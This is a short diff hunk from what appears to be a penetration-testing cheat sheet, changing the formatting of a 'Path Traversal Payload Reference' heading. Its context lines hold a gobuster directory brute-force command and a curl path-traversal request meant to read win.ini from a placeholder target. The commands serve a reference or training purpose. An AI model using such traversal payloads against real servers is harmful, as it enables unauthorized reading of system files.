@@ -305,7 +305,7 @@ gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x ph
       curl "http://<target_ip>/<target_php>?=../../../../windows/win.ini"  # Windows Based Server
       ```
 
-      - Path Traversal Payload Reference
+  **Path Traversal Payload Reference**
 
   | Target File                           | OS      | Objective                                 |
   | ------------------------------------- | ------- | ----------------------------------------- |
